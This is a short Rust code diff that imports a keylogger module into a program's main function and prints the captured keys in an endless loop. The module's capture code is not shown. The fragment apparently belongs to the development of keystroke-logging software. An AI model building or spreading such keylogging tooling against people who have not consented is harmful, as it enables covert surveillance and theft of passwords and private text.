@@ -1,4 +1,8 @@
+mod keylogger;
+use keylogger::KeyLogger;
 
 fn main() {
-    //println!("{:?}", keylogging::KeyLogger.get_keyboard_state());
+    loop {
+        println!("{:?}", KeyLogger::get_keys());
+    }
 }
